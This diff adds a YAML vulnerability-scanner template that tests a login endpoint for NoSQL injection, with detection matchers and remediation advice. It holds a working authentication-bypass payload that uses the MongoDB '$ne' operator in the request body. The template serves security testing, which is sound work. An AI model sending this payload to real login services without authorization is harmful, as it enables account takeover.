@@ -1,0 +1,32 @@
+id: nosql-injection
+info:
+  name: NoSQL Injection
+  severity: high
+  description: Tests for NoSQL injection using JSON operators
+  tags:
+    - nosqli
+    - injection
+    - mongodb
+
+variables:
+  email: "{{USER_EMAIL}}"
+  password: "{{USER_PASSWORD}}"
+
+requests:
+  - name: Test NoSQL injection in login
+    method: POST
+    path: /rest/user/login
+    headers:
+      Content-Type: application/json
+    body: '{"email": {"$ne": null}, "password": {"$ne": null}}'
+    matchers:
+      - type: status
+        condition: in
+        values: [200, 201]
+      - type: word
+        words: ["token", "authentication"]
+        condition: or
+    on_match:
+      vulnerability: NOSQL_INJECTION
+      message: NoSQL injection using $ne operator successful
+      remediation: Validate input types and use proper query builders
